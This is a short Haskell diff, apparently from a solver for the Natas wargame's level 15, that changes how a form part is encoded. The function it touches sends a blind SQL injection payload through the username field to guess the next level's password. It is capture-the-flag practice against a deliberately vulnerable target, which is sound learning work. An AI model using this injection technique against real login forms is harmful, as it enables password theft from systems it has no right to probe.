@@ -6,10 +6,9 @@ import           Control.Monad       (filterM)
 
 import           Data.List           (intersperse)
 import           Data.Text           (breakOn, pack)
-import           Data.Text.Encoding  (encodeUtf8)
 
 import           Control.Monad.Loops (firstM)
-import           Network.Wreq        (partBS)
+import           Network.Wreq        (partText)
 
 import           Natas.Natas
 
@@ -34,9 +33,9 @@ buildPassword avail curr = do
 attemptPassword :: String -> IO Bool
 attemptPassword guess = do
   let sqlInject =
-        (encodeUtf8 . pack . concat)
+        (pack . concat)
           ["natas16\" and password LIKE BINARY \"", guess, "\" -- "]
-      form = partBS "username" sqlInject
+      form = partText "username" sqlInject
   req <- postLevel 15 form
   let body = reqBody req
   pure $
